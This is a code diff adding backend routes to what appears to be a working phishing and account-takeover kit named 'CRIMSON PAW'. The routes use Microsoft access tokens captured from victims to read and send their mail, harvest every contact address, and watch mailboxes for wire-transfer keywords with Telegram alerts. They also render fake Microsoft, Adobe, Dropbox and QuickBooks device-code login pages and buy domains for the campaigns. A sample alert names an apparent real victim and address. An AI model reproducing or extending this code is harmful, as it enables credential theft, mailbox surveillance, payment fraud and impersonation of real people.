+def proxy_batch_update():
+    """Apply the same PATCH update to multiple messages (e.g. mark all read)."""
+    data    = request.json or {}
+    uc      = data.get('user_code')
+    s       = db.get_session_by_user_code(uc)
+    if not s or s['status'] != 'CAPTURED':
+        return jsonify({'error': 'Invalid session'}), 400
+    token    = db.get_graph_access_token(s)
+    msg_ids  = data.get('message_ids', [])
+    updates  = data.get('updates', {})   # e.g. {"isRead": true}
+    updated  = failed = 0
+    for mid in msg_ids:
+        try:
+            r = graph.make_graph_request(f'/me/messages/{mid}', token, method='PATCH', payload=updates)
+            if r and r.get('error'):
+                failed += 1
+            else:
+                updated += 1
+        except Exception:
+            failed += 1
+    return jsonify({'updated': updated, 'failed': failed})
+
+@app.route('/api/graph_proxy/send_mail', methods=['POST'])
+def proxy_send_mail():
+    data = request.json or {}
+    uc = data.get('user_code')
+    s = db.get_session_by_user_code(uc)
+    if not s or s['status'] != 'CAPTURED': return jsonify({'error': {'message': 'Invalid session'}}), 400
+    token = db.get_graph_access_token(s)
+    payload = data.get('payload', {})
+    res = graph.make_graph_request('/me/sendMail', token, method='POST', payload=payload)
+    if res and res.get('error'):
+        return jsonify(res), 400
+    return jsonify(res or {'success': True})
+
+# ═══════════════════════════════════════════════════════════════════
+# EXTRACTOR ROUTES
+# ═══════════════════════════════════════════════════════════════════
+import re as _re
+import io as _io
+import csv as _csv
+from flask import Response, stream_with_context
+
+# In-memory store: user_code -> list of extracted email strings
+_extractor_results: dict = {}
+
+def _iter_graph_pages(endpoint, token, params=None):
+    """Yield items from a paged Graph API endpoint."""
+    url = f"https://graph.microsoft.com/v1.0{endpoint}"
+    import requests as _req
+    headers = {'Authorization': f'Bearer {token}', 'Content-Type': 'application/json'}
+    p = params or {}
+    while url:
+        try:
+            r = _req.get(url, headers=headers, params=p, timeout=20)
+            r.raise_for_status()
+            data = r.json()
+        except Exception:
+            break
+        for item in data.get('value', []):
+            yield item
+        url = data.get('@odata.nextLink')
+        p = {}  # nextLink already has params
+
+def _extract_email(addr_obj):
+    """Pull email string from a Graph emailAddress object or plain string."""
+    if isinstance(addr_obj, dict):
+        ea = addr_obj.get('emailAddress', addr_obj)
+        return (ea.get('address') or '').strip().lower()
+    return str(addr_obj).strip().lower()
+
+def _is_valid_email(s):
+    return bool(_re.match(r'^[^@\s]+@[^@\s]+\.[^@\s]+$', s))
+
+@app.route('/api/extractor/stream', methods=['GET'])
+def extractor_stream():
+    uc = request.args.get('user_code', '').strip()
+    do_mail = request.args.get('mail', 'false').lower() == 'true'
+    do_contacts = request.args.get('contacts', 'false').lower() == 'true'
+
+    s = db.get_session_by_user_code(uc)
+    if not s or s.get('status') != 'CAPTURED':
+        def _err():
+            yield 'data: {"type":"error","msg":"Invalid or non-captured session"}\n\n'
+        return Response(stream_with_context(_err()), mimetype='text/event-stream')
+
+    token = db.get_graph_access_token(s)
+
+    def generate():
+        import time as _time
+        collected = set()
+        mail_count = 0
+        scanned = 0
+
+        def sse(obj):
+            import json as _json
+            return f'data: {_json.dumps(obj)}\n\n'
+
+        yield sse({'type': 'status', 'msg': '🚀 Starting extraction...', 'cls': 'header'})
+
+        if do_mail:
+            yield sse({'type': 'status', 'msg': '📁 Fetching mail folders...', 'cls': 'header'})
+            folders = []
+            try:
+                for f in _iter_graph_pages('/me/mailFolders', token, {'$top': '100', '$select': 'id,displayName,totalItemCount'}):
+                    folders.append(f)
+                    yield sse({'type': 'status', 'msg': f'  Found folder: {f.get("displayName","?")} ({f.get("totalItemCount",0)} items)', 'cls': 'dim'})
+            except Exception as ex:
+                yield sse({'type': 'status', 'msg': f'⚠ Could not list folders: {ex}', 'cls': 'warn'})
+
+            if not folders:
+                # Fallback to default folders
+                folders = [{'id': 'inbox', 'displayName': 'Inbox'}, {'id': 'sentitems', 'displayName': 'Sent Items'},
+                           {'id': 'deleteditems', 'displayName': 'Deleted Items'}, {'id': 'archive', 'displayName': 'Archive'}]
+
+            total_folders = len(folders)
+            for fi, folder in enumerate(folders):
+                fid = folder['id']
+                fname = folder.get('displayName', fid)
+                yield sse({'type': 'status', 'msg': f'📧 Scanning [{fi+1}/{total_folders}] {fname}...', 'cls': 'header'})
+                yield sse({'type': 'progress', 'pct': int(30 * fi / total_folders)})
+
+                fields = '$select=from,toRecipients,ccRecipients,bccRecipients,replyTo'
+                endpoint = f'/me/mailFolders/{fid}/messages'
+                try:
+                    for msg in _iter_graph_pages(endpoint, token, {'$top': '100', fields: ''}):
+                        scanned += 1
+                        # Collect all address fields
+                        candidates = []
+                        frm = msg.get('from', {})
+                        if frm: candidates.append(_extract_email(frm))
+                        for field in ['toRecipients', 'ccRecipients', 'bccRecipients', 'replyTo']:
+                            for rcp in msg.get(field, []):
+                                candidates.append(_extract_email(rcp))
+                        for em in candidates:
+                            if em and _is_valid_email(em) and em not in collected:
+                                collected.add(em)
+                                mail_count += 1
+                                yield sse({'type': 'email', 'email': em, 'source': 'mail', 'cls': 'success',
+                                           'mail': mail_count, 'emails': len(collected), 'scanned': scanned})
+                except Exception as ex:
+                    yield sse({'type': 'status', 'msg': f'  ⚠ Error in {fname}: {ex}', 'cls': 'warn'})
+
+        if do_contacts:
+            yield sse({'type': 'status', 'msg': '👤 Fetching contact folders...', 'cls': 'header'})
+            contact_folders = [{'id': 'contacts', 'displayName': 'Contacts'}]
+            try:
+                for cf in _iter_graph_pages('/me/contactFolders', token, {'$top': '100', '$select': 'id,displayName'}):
+                    contact_folders.append(cf)
+            except Exception:
+                pass
+
+            for cf in contact_folders:
+                cid = cf['id']
+                cname = cf.get('displayName', cid)
+                endpoint = f'/me/contactFolders/{cid}/contacts' if cid != 'contacts' else '/me/contacts'
+                yield sse({'type': 'status', 'msg': f'👥 Scanning contacts: {cname}', 'cls': 'header'})
+                try:
+                    for contact in _iter_graph_pages(endpoint, token, {'$top': '100', '$select': 'displayName,emailAddresses'}):
+                        scanned += 1
+                        for ea in contact.get('emailAddresses', []):
+                            em = _extract_email(ea)
+                            if em and _is_valid_email(em) and em not in collected:
+                                collected.add(em)
+                                yield sse({'type': 'email', 'email': em, 'source': 'contact',
+                                           'name': contact.get('displayName',''), 'cls': 'success',
+                                           'mail': mail_count, 'emails': len(collected), 'scanned': scanned})
+                except Exception as ex:
+                    yield sse({'type': 'status', 'msg': f'  ⚠ Error in {cname}: {ex}', 'cls': 'warn'})
+
+        # Store results
+        _extractor_results[uc] = sorted(collected)
+        yield sse({'type': 'done', 'total': len(collected), 'mail': mail_count, 'scanned': scanned,
+                   'msg': f'✅ Extraction complete. {len(collected)} unique emails found.', 'cls': 'success'})
+
+    return Response(stream_with_context(generate()), mimetype='text/event-stream',
+                    headers={'Cache-Control': 'no-cache', 'X-Accel-Buffering': 'no'})
+
+
+@app.route('/api/extractor/download', methods=['GET'])
+def extractor_download():
+    uc = request.args.get('user_code', '').strip()
+    fmt = request.args.get('format', 'txt').lower()
+    emails = _extractor_results.get(uc, [])
+    victim = ''
+    s = db.get_session_by_user_code(uc)
+    if s:
+        victim = (s.get('victim_name') or s.get('victim_email') or uc).replace(' ', '_')
+    else:
+        victim = uc
+    if fmt == 'csv':
+        si = _io.StringIO()
+        w = _csv.writer(si)
+        w.writerow(['email_address'])
+        for em in emails:
+            w.writerow([em])
+        output = si.getvalue().encode('utf-8')
+        filename = f'{victim}_extracted.csv'
+        mime = 'text/csv'
+    else:
+        output = '\n'.join(emails).encode('utf-8')
+        filename = f'{victim}_extracted.txt'
+        mime = 'text/plain'
+    return Response(output, mimetype=mime,
+                    headers={'Content-Disposition': f'attachment; filename="{filename}"'})
+
+# ═══════════════════════════════════════════════════════════════════
+# SORTER ROUTE
+# ═══════════════════════════════════════════════════════════════════
+
+# In-memory store: last sorted result per client (keyed by session_id cookie)
+_sorter_results: dict = {}
+
+_EMAIL_PATTERN = _re.compile(r'[a-zA-Z0-9._%+\-]+@[a-zA-Z0-9.\-]+\.[a-zA-Z]{2,}')
+
+WELL_KNOWN_DOMAINS = {
+    'gmail.com': 'Gmail', 'googlemail.com': 'Gmail',
+    'yahoo.com': 'Yahoo', 'yahoo.co.uk': 'Yahoo', 'ymail.com': 'Yahoo', 'rocketmail.com': 'Yahoo',
+    'outlook.com': 'Outlook', 'hotmail.com': 'Hotmail', 'hotmail.co.uk': 'Hotmail',
+    'live.com': 'Live', 'msn.com': 'MSN', 'passport.com': 'Microsoft',
+    'icloud.com': 'iCloud', 'me.com': 'iCloud', 'mac.com': 'iCloud',
+    'aol.com': 'AOL', 'aim.com': 'AOL',
+    'protonmail.com': 'ProtonMail', 'pm.me': 'ProtonMail', 'proton.me': 'ProtonMail',
+    'zoho.com': 'Zoho',
+}
+
+@app.route('/api/sorter/sort', methods=['POST'])
+def sorter_sort():
+    raw = ''
+    if 'file' in request.files:
+        f = request.files['file']
+        raw = f.read().decode('utf-8', errors='ignore')
+    elif request.is_json:
+        raw = request.json.get('text', '')
+    else:
+        raw = request.get_data(as_text=True)
+
+    emails_found = list(dict.fromkeys(_EMAIL_PATTERN.findall(raw)))  # deduplicate, preserve order
+    grouped: dict = {}
+    for em in emails_found:
+        domain = em.split('@')[1].lower()
+        provider = WELL_KNOWN_DOMAINS.get(domain, domain)
+        grouped.setdefault(provider, []).append(em.lower())
+
+    # Sort groups by count descending
+    sorted_groups = sorted(grouped.items(), key=lambda x: len(x[1]), reverse=True)
+    # Store keyed by remote addr (simple)
+    client_key = request.remote_addr or 'default'
+    _sorter_results[client_key] = sorted_groups
+
+    return jsonify({
+        'total': len(emails_found),
+        'domains': len(grouped),
+        'groups': [{'provider': p, 'count': len(v), 'emails': v} for p, v in sorted_groups]
+    })
+
+
+@app.route('/api/sorter/download', methods=['GET'])
+def sorter_download():
+    fmt = request.args.get('format', 'txt').lower()
+    client_key = request.remote_addr or 'default'
+    groups = _sorter_results.get(client_key, [])
+    if fmt == 'zip':
+        import zipfile, io
+        buf = io.BytesIO()
+        with zipfile.ZipFile(buf, 'w', zipfile.ZIP_DEFLATED) as zf:
+            total_emails = 0
+            summary_lines = ['=== SORTED EMAIL DOMAINS SUMMARY ===', f'Total Domains / Groups: {len(groups)}', '']
+            for provider, emails in groups:
+                safe_name = _re.sub(r'[^a-zA-Z0-9._\-]', '_', str(provider).strip().lower())
+                filename = f"{safe_name}.txt" if not safe_name.endswith('.txt') else safe_name
+                content = '\n'.join(emails) + '\n'
+                zf.writestr(filename, content)
+                total_emails += len(emails)
+                summary_lines.append(f"{filename:<32} : {len(emails)} emails")
+            summary_lines.insert(2, f"Total Unique Emails: {total_emails}")
+            summary_lines.append('')
+            summary_lines.append('Exported by CRIMSON PAW Sorter Suite.')
+            zf.writestr('_summary.txt', '\n'.join(summary_lines) + '\n')
+        buf.seek(0)
+        return Response(buf.getvalue(), mimetype='application/zip',
+                        headers={'Content-Disposition': 'attachment; filename="sorted_by_domain.zip"'})
+    elif fmt == 'csv':
+        si = _io.StringIO()
+        w = _csv.writer(si)
+        w.writerow(['provider', 'email_address'])
+        for provider, emails in groups:
+            for em in emails:
+                w.writerow([provider, em])
+        output = si.getvalue().encode('utf-8')
+        return Response(output, mimetype='text/csv',
+                        headers={'Content-Disposition': 'attachment; filename="sorted_emails.csv"'})
+    else:
+        lines = []
+        for provider, emails in groups:
+            lines.append(f'=== {provider} ({len(emails)}) ===')
+            lines.extend(emails)
+            lines.append('')
+        output = '\n'.join(lines).encode('utf-8')
+        return Response(output, mimetype='text/plain',
+                        headers={'Content-Disposition': 'attachment; filename="sorted_emails.txt"'})
+
+
+
+# ════════════════════════════════════════════════════════════════
+# LINK GENERATOR / DEPLOYMENTS ROUTES  (Phase 2)
+# ════════════════════════════════════════════════════════════════
+import deployments as _dep
+
+# ─── Pre-land templates ──────────────────────────────────────────────────────
+@app.route('/api/lg/preland_templates', methods=['GET'])
+def lg_get_preland_templates():
+    return jsonify(_dep.get_preland_templates())
+
+@app.route('/api/lg/preland_templates/<int:tid>', methods=['GET'])
+def lg_get_preland_template(tid):
+    t = _dep.get_preland_template(tid)
+    return jsonify(t) if t else (jsonify({'error':'Not found'}), 404)
+
+@app.route('/api/lg/preland_templates/<int:tid>/preview', methods=['POST'])
+def lg_preview_preland(tid):
+    """Return live-rendered pre-land HTML from the supplied config overrides."""
+    t = _dep.get_preland_template(tid)
+    if not t:
+        return jsonify({'error':'Template not found'}), 404
+    default_cfg = {}
+    try:   default_cfg = json.loads(t.get('default_config') or '{}')
+    except: pass
+    override = request.json or {}
+    merged = {**default_cfg, **override}
+    merged['icon'] = t.get('icon','📄')
+    html = _dep.render_preland(t['name'], merged, '#')
+    return jsonify({'html': html})
+
+@app.route('/api/lg/preview/preland', methods=['POST'])
+def lg_preview_preland_direct():
+    """Render a pre-landing page preview directly from template_name + config."""
+    d = request.json or {}
+    template_name = d.get('template_name', 'Microsoft 365')
+    cfg = d.get('config', {})
+    proceed_url = d.get('proceed_url', '#')
+    html = _dep.render_preland(template_name, cfg, proceed_url)
+    return jsonify({'html': html})
+
+@app.route('/api/lg/preview/landing', methods=['POST'])
+def lg_preview_landing():
+    """Render a landing page preview with a sample verification code (all 4 modes)."""
+    d = request.json or {}
+    template_name    = d.get('template_name', 'OneDrive')
+    cfg              = d.get('config', {})
+    user_code        = d.get('user_code', 'ABCD-1234')
+    verify_uri       = d.get('verification_uri', 'https://microsoft.com/devicelogin')
+    success_url      = d.get('success_url', 'https://www.office.com/')
+    mode             = d.get('mode', cfg.get('landing_mode', 'S'))
+    victim_ip        = d.get('victim_ip', '196.234.12.xx')
+    victim_location  = d.get('victim_location', 'Frankfurt, Germany')
+    html = _dep.render_landing(template_name, cfg, user_code, verify_uri, success_url,
+                               mode=mode, victim_ip=victim_ip, victim_location=victim_location)
+    return jsonify({'html': html})
+
+@app.route('/api/lg/preview/success', methods=['POST'])
+def lg_preview_success():
+    """Render a success page preview."""
+    d = request.json or {}
+    template_name = d.get('template_name', 'OneDrive')
+    cfg           = d.get('config', {})
+    success_url   = d.get('success_url', 'https://www.office.com/')
+    html = _dep.render_success(template_name, cfg, success_url)
+    return jsonify({'html': html})
+
+# ─── Keyword Alerts & Surveillance API ────────────────────────────────────
+@app.route('/api/keyword_alerts/stats')
+def api_keyword_alerts_stats():
+    """Return live summary counts for keyword rules and detected hits."""
+    stats = db.get_keyword_stats()
+    return jsonify(stats)
+
+@app.route('/api/keyword_alerts/rules', methods=['GET', 'POST'])
+def api_keyword_alerts_rules():
+    """List or create keyword alert rules."""
+    if request.method == 'POST':
+        d = request.json or {}
+        name = d.get('name', '').strip()
+        if not name:
+            return jsonify({'error': 'Rule name is required'}), 400
+        category = d.get('category', 'Custom').strip()
+        severity = d.get('severity', 'HIGH').upper()
+        keywords = d.get('keywords', [])
+        if not keywords:
+            return jsonify({'error': 'At least one keyword is required'}), 400
+        search_scope = d.get('search_scope', 'all')
+        target_account = d.get('target_account', 'all')
+        notify_telegram = 1 if d.get('notify_telegram', True) else 0
+        notify_webhook = 1 if d.get('notify_webhook', True) else 0
+        is_active = 1 if d.get('is_active', True) else 0
+        
+        new_id = db.add_keyword_rule(
+            name=name, category=category, severity=severity, keywords=keywords,
+            search_scope=search_scope, target_account=target_account,
+            notify_telegram=notify_telegram, notify_webhook=notify_webhook, is_active=is_active
+        )
+        return jsonify({'status': 'ok', 'id': new_id, 'message': 'Rule created successfully'})
+    
+    rules = db.get_keyword_rules()
+    return jsonify({'status': 'ok', 'rules': rules})
+
+@app.route('/api/keyword_alerts/rules/<int:rule_id>', methods=['GET', 'PUT', 'DELETE'])
+def api_keyword_alerts_rule_detail(rule_id):
+    """Retrieve, update, or delete a specific keyword rule."""
+    if request.method == 'DELETE':
+        db.delete_keyword_rule(rule_id)
+        return jsonify({'status': 'ok', 'message': 'Rule deleted'})
+    
+    if request.method == 'PUT':
+        d = request.json or {}
+        name = d.get('name', '').strip()
+        category = d.get('category', 'Custom').strip()
+        severity = d.get('severity', 'HIGH').upper()
+        keywords = d.get('keywords', [])
+        search_scope = d.get('search_scope', 'all')
+        target_account = d.get('target_account', 'all')
+        notify_telegram = 1 if d.get('notify_telegram', True) else 0
+        notify_webhook = 1 if d.get('notify_webhook', True) else 0
+        is_active = 1 if d.get('is_active', True) else 0
+        db.update_keyword_rule(
+            rule_id, name, category, severity, keywords,
+            search_scope, target_account, notify_telegram, notify_webhook, is_active
+        )
+        return jsonify({'status': 'ok', 'message': 'Rule updated'})
+    
+    rule = db.get_keyword_rule(rule_id)
+    if not rule:
+        return jsonify({'error': 'Rule not found'}), 404
+    return jsonify({'status': 'ok', 'rule': rule})
+
+@app.route('/api/keyword_alerts/rules/<int:rule_id>/toggle', methods=['POST'])
+def api_keyword_alerts_rule_toggle(rule_id):
+    """Toggle a keyword rule active/inactive."""
+    d = request.json or {}
+    is_active = 1 if d.get('is_active', True) else 0
+    db.toggle_keyword_rule(rule_id, is_active)
+    return jsonify({'status': 'ok', 'is_active': is_active})
+
+@app.route('/api/keyword_alerts/matches', methods=['GET'])
+def api_keyword_alerts_matches():
+    """Retrieve filtered list of detected keyword hits."""
+    severity = request.args.get('severity')
+    account = request.args.get('account')
+    rule_id = request.args.get('rule_id', type=int)
+    triaged = request.args.get('triaged')
+    limit = request.args.get('limit', 100, type=int)
+    offset = request.args.get('offset', 0, type=int)
+    
+    matches = db.get_keyword_matches(
+        severity=severity, target_account=account,
+        rule_id=rule_id, triaged=triaged, limit=limit, offset=offset
+    )
+    return jsonify({'status': 'ok', 'matches': matches})
+
+@app.route('/api/keyword_alerts/matches/<int:match_id>/triage', methods=['POST'])
+def api_keyword_alerts_match_triage(match_id):
+    """Mark a match as triaged (reviewed)."""
+    d = request.json or {}
+    is_triaged = 1 if d.get('is_triaged', True) else 0
+    db.triage_keyword_match(match_id, is_triaged)
+    return jsonify({'status': 'ok', 'is_triaged': is_triaged})
+
+@app.route('/api/keyword_alerts/matches/<int:match_id>', methods=['DELETE'])
+def api_keyword_alerts_match_delete(match_id):
+    """Delete a single match record."""
+    db.delete_keyword_match(match_id)
+    return jsonify({'status': 'ok'})
+
+@app.route('/api/keyword_alerts/matches/clear', methods=['POST'])
+def api_keyword_alerts_matches_clear():
+    """Clear all keyword matches from database."""
+    db.clear_keyword_matches()
+    return jsonify({'status': 'ok', 'message': 'All matches cleared'})
+
+@app.route('/api/keyword_alerts/scan_now', methods=['POST'])
+def api_keyword_alerts_scan_now():
+    """Trigger an on-demand scan across all or selected victim accounts."""
+    d = request.json or {}
+    account = d.get('account', 'all')
+    rule_ids = d.get('rule_ids', None)
+
+    if account != 'all':
+        sessions = db.get_all_sessions()
+        target_s = next((s for s in sessions if s.get('user_code') == account), None)
+        if not target_s:
+            return jsonify({'error': 'Target account session not found'}), 404
+        rules = db.get_keyword_rules(active_only=True)
+        if rule_ids:
+            rules = [r for r in rules if r['id'] in rule_ids]
+        res = keyword_watcher.scan_victim_mailbox(target_s, rules=rules)
+        return jsonify(res)
+    else:
+        res = keyword_watcher.scan_all_victims(rule_ids=rule_ids)
+        return jsonify(res)
+
+@app.route('/api/keyword_alerts/telegram_config', methods=['GET', 'POST'])
+def api_keyword_alerts_telegram_config():
+    """Retrieve or update dedicated Telegram bot configuration for Keyword Alerts."""
+    cfg = {}
+    if SETTINGS_FILE.exists():
+        try:
+            with open(SETTINGS_FILE, 'r', encoding='utf-8') as f:
+                cfg = json.load(f)
+        except Exception: pass
+
+    if request.method == 'POST':
+        d = request.json or {}
+        cfg['kwa_tg_bot_token'] = d.get('bot_token', '').strip()
+        cfg['kwa_tg_chat_id']   = d.get('chat_id', '').strip()
+        cfg['kwa_tg_enabled']   = bool(d.get('enabled', True))
+        try:
+            with open(SETTINGS_FILE, 'w', encoding='utf-8') as f:
+                json.dump(cfg, f, indent=2)
+            return jsonify({'success': True, 'message': 'Keyword Alert Telegram settings saved successfully'})
+        except Exception as e:
+            return jsonify({'success': False, 'error': str(e)}), 500
+
+    return jsonify({
+        'bot_token': cfg.get('kwa_tg_bot_token', ''),
+        'chat_id': cfg.get('kwa_tg_chat_id', ''),
+        'enabled': cfg.get('kwa_tg_enabled', True)
+    })
+
+@app.route('/api/keyword_alerts/test_telegram', methods=['POST'])
+def api_keyword_alerts_test_telegram():
+    """Dispatch a test message using the dedicated Keyword Alert Telegram bot."""
+    d = request.json or {}
+    cfg = {}
+    if SETTINGS_FILE.exists():
+        try:
+            with open(SETTINGS_FILE, 'r', encoding='utf-8') as f:
+                cfg = json.load(f)
+        except Exception: pass
+
+    bot_token = d.get('bot_token', '').strip() or cfg.get('kwa_tg_bot_token', '').strip()
+    chat_id   = d.get('chat_id', '').strip() or cfg.get('kwa_tg_chat_id', '').strip()
+
+    if not bot_token:
+        return jsonify({'success': False, 'message': 'Bot Token is required. Please enter your HTTP API Bot Token from @BotFather.'}), 400
+    if not chat_id:
+        return jsonify({'success': False, 'message': 'Chat ID is required. Please enter your Telegram numerical user or group ID.'}), 400
+
+    test_html = (
+        "🚨 <b>CRIMSON PAW KEYWORD ALERT — BOT TEST</b> 🚨\n"
+        "👤 <b>Victim:</b> Lizbeth Lozoya\n"
+        "📧 <b>Account:</b> <code>llozoya@solomon-arieh.com</code>\n"
+        "🎯 <b>Matched:</b> <code>WIRE TRANSFER</code> (CRITICAL)\n"
+        "📁 <b>Rule:</b> Financial & Wire Transfers\n"
+        "✉️ <b>Subject:</b> URGENT: Updated Wire Instructions for Vendor Settlement\n"
+        "📩 <b>From:</b> accounting@external-partner.com\n"
+        "💬 <b>Snippet:</b> <i>\"...please redirect the wire transfer of $84,500 to our newly updated routing number and bank account...\"</i>\n"
+        "🔑 <b>Session:</b> <code>DVWRHR76J</code>\n\n"
+        "✅ <b>Status:</b> <i>Dedicated Keyword Alerts Telegram Bot is active and verified!</i>"
+    )
+
+    ok, msg = keyword_watcher.send_keyword_telegram_message(bot_token, chat_id, test_html)
+    if ok:
+        return jsonify({'success': True, 'message': 'Test alert delivered to Telegram successfully!'})
+    else:
+        return jsonify({'success': False, 'message': msg}), 400
+
+# ─── Direct In-Browser Template Showcase ───────────────────────────────────
+@app.route('/preview', methods=['GET'])
+def preview_showcase():
+    return render_template_string(r'''<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="utf-8">
+    <title>CRIMSON PAW — Template Showcase</title>
+    <style>
+        * { box-sizing: border-box; margin: 0; padding: 0; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; }
+        body { background: #141517; color: #e1e3e8; display: flex; flex-direction: column; height: 100vh; overflow: hidden; }
+        header { background: #1f2024; border-bottom: 1px solid #32343c; padding: 12px 20px; display: flex; align-items: center; justify-content: space-between; flex-wrap: wrap; gap: 12px; }
+        .brand { font-weight: 700; font-size: 14px; color: #4f8df7; display: flex; align-items: center; gap: 8px; }
+        .controls { display: flex; align-items: center; gap: 10px; flex-wrap: wrap; }
+        .group-label { font-size: 11px; text-transform: uppercase; letter-spacing: 0.6px; color: #888a93; margin-right: 4px; font-weight: 600; }
+        .btn-group { display: inline-flex; background: #2a2b31; border-radius: 6px; padding: 2px; }
+        .btn { border: none; background: transparent; color: #a6a8b2; padding: 6px 12px; font-size: 12px; font-weight: 600; cursor: pointer; border-radius: 4px; transition: all 0.15s; }
+        .btn:hover { color: #fff; background: rgba(255,255,255,0.05); }
+        .btn.active { background: #0078d4; color: #fff; }
+        .open-raw { color: #888a93; font-size: 12px; text-decoration: none; padding: 6px 10px; border-radius: 4px; border: 1px solid #3e4049; }
+        .open-raw:hover { color: #fff; border-color: #666; }
+        .frame-wrap { flex: 1; width: 100%; height: 100%; position: relative; background: #fff; }
+        iframe { width: 100%; height: 100%; border: none; display: block; }
+    </style>
+</head>
+<body>
+    <header>
+        <div class="brand">
+            <span>🐾 CRIMSON PAW</span>
+            <span style="color:#555;">/</span>
+            <span style="color:#ddd;font-weight:600;">Built Templates Showcase</span>
+        </div>
+        <div class="controls">
+            <span class="group-label">Template:</span>
+            <div class="btn-group" id="template-group">
+                <button class="btn" onclick="setTemplate('Adobe')">Adobe</button>
+                <button class="btn" onclick="setTemplate('Dropbox')">Dropbox</button>
+                <button class="btn active" onclick="setTemplate('OneDrive')">OneDrive</button>
+                <button class="btn" onclick="setTemplate('QuickBooks')">QuickBooks</button>
+                <button class="btn" onclick="setTemplate('Outlook')">Outlook</button>
+                <button class="btn" onclick="setTemplate('Microsoft 365')">Microsoft 365</button>
+            </div>
+
+            <span class="group-label" style="margin-left: 10px;">Stage / Mode:</span>
+            <div class="btn-group" id="stage-group">
+                <button class="btn" onclick="setStage('preland')">Pre-landing</button>
+                <button class="btn active" onclick="setStage('landing', 'S')">Landing (Mode S)</button>
+                <button class="btn" onclick="setStage('landing', 'B')">Landing (Mode B)</button>
+                <button class="btn" onclick="setStage('landing', 'A')">Landing (Mode A)</button>
+                <button class="btn" onclick="setStage('landing', 'R')">Landing (Mode R)</button>
+                <button class="btn" onclick="setStage('success')">Success</button>
+            </div>
+
+            <a id="raw-link" class="open-raw" target="_blank" href="#" title="Open raw page in new tab">↗ New Tab</a>
+        </div>
+    </header>
+    <div class="frame-wrap">
+        <iframe id="preview-frame" src="/preview/landing?template=OneDrive&mode=S"></iframe>
+    </div>
+    <script>
+        let currentTemplate = 'OneDrive';
+        let currentStage = 'landing';
+        let currentMode = 'S';
+
+        function update() {
+            let url = '';
+            if (currentStage === 'preland') {
+                url = '/preview/preland?template=' + encodeURIComponent(currentTemplate);
+            } else if (currentStage === 'landing') {
+                url = '/preview/landing?template=' + encodeURIComponent(currentTemplate) + '&mode=' + currentMode;
+            } else {
+                url = '/preview/success?template=' + encodeURIComponent(currentTemplate);
+            }
+            document.getElementById('preview-frame').src = url;
+            document.getElementById('raw-link').href = url;
+        }
+
+        function setTemplate(t) {
+            currentTemplate = t;
+            document.querySelectorAll('#template-group .btn').forEach(b => {
+                b.classList.toggle('active', b.textContent === t);
+            });
+            update();
+        }
+
+        function setStage(stage, mode='S') {
+            currentStage = stage;
+            currentMode = mode;
+            document.querySelectorAll('#stage-group .btn').forEach(b => {
+                if (stage === 'landing') {
+                    b.classList.toggle('active', b.textContent.includes('Mode ' + mode));
+                } else if (stage === 'preland') {
+                    b.classList.toggle('active', b.textContent === 'Pre-landing');
+                } else {
+                    b.classList.toggle('active', b.textContent === 'Success');
+                }
+            });
+            update();
+        }
+
+        update();
+    </script>
+</body>
+</html>''')
+
+@app.route('/preview/landing', methods=['GET'])
+def preview_landing_direct():
+    t_name = request.args.get('template', 'OneDrive')
+    mode = request.args.get('mode', 'S').upper()
+    code = request.args.get('code', 'ABCD-1234')
+    html = _dep.render_landing(t_name, {}, code, 'https://microsoft.com/devicelogin', 'https://www.office.com/',
+                               mode=mode, victim_ip='196.234.12.xx', victim_location='Frankfurt, Germany')
+    return html, 200, {'Content-Type': 'text/html; charset=utf-8'}
+
+@app.route('/preview/preland', methods=['GET'])
+def preview_preland_direct():
+    t_name = request.args.get('template', 'OneDrive')
+    html = _dep.render_preland(t_name, {}, '#')
+    return html, 200, {'Content-Type': 'text/html; charset=utf-8'}
+
+@app.route('/preview/success', methods=['GET'])
+def preview_success_direct():
+    t_name = request.args.get('template', 'OneDrive')
+    html = _dep.render_success(t_name, {}, 'https://www.office.com/')
+    return html, 200, {'Content-Type': 'text/html; charset=utf-8'}
+
+
+# ─── Owned domains ──────────────────────────────────────────────────────────
+@app.route('/api/lg/domains', methods=['GET'])
+def lg_get_domains():
+    return jsonify(_dep.get_owned_domains())
+
+@app.route('/api/lg/domains', methods=['POST'])
+def lg_add_domain():
+    d = request.json or {}
+    domain = d.get('domain','').strip().lower()
+    if not domain:
+        return jsonify({'error':'domain required'}), 400
+    domain = re.sub(r'^https?://', '', domain, flags=re.IGNORECASE).rstrip('/').strip().lower()
+    _dep.add_owned_domain(domain, d.get('registrar','manual'), d.get('expiry_date'))
+    return jsonify({'success': True, 'domain': domain})
+
+@app.route('/api/lg/domains/<path:domain>', methods=['DELETE'])
+def lg_delete_domain(domain):
+    _dep.delete_owned_domain(domain)
+    return jsonify({'success': True})
+
+@app.route('/api/lg/domains/deleted', methods=['GET'])
+def lg_get_deleted_domains():
+    return jsonify(_dep.get_deleted_domains())
+
+@app.route('/api/lg/domains/<path:domain>/restore', methods=['POST'])
+def lg_restore_domain(domain):
+    _dep.restore_owned_domain(domain)
+    return jsonify({'success': True, 'domain': domain})
+
+@app.route('/api/lg/domains/<path:domain>/ns', methods=['PATCH'])
+def lg_mark_ns(domain):
+    configured = (request.json or {}).get('ns_configured', True)
+    _dep.mark_domain_ns(domain, configured)
+    return jsonify({'success': True})
+
+# ─── Namecheap domain search / purchase ─────────────────────────────────────
+@app.route('/api/lg/domains/search', methods=['POST'])
+def lg_domain_search():
+    d = request.json or {}
+    domains = d.get('domains', [])
+    if not domains:
+        return jsonify({'error':'domains list required'}), 400
+    return jsonify(_dep.namecheap_search(domains))
+
+@app.route('/api/lg/domains/suggest', methods=['POST'])
+def lg_domain_suggest():
+    d = request.json or {}
+    keyword = d.get('keyword','').strip().lower()
+    tlds    = d.get('tlds', ['com','net','org','io','co','info','xyz','app'])
+    if not keyword:
+        return jsonify({'error':'keyword required'}), 400
+    return jsonify(_dep.namecheap_suggest(keyword, tlds))
+
+@app.route('/api/lg/domains/purchase', methods=['POST'])
+def lg_domain_purchase():
+    d = request.json or {}
+    sld  = d.get('sld','').strip().lower()
+    tld  = d.get('tld','').strip().lower()
+    years = int(d.get('years', 1))
+    registrant = d.get('registrant', {})
+    if not sld or not tld:
+        return jsonify({'error':'sld and tld required'}), 400
+    result = _dep.namecheap_purchase(sld, tld, years, registrant)
+    return jsonify(result)
+
+# ─── Deployments CRUD ────────────────────────────────────────────────────────
+@app.route('/api/lg/deployments', methods=['GET'])
+def lg_list_deployments():
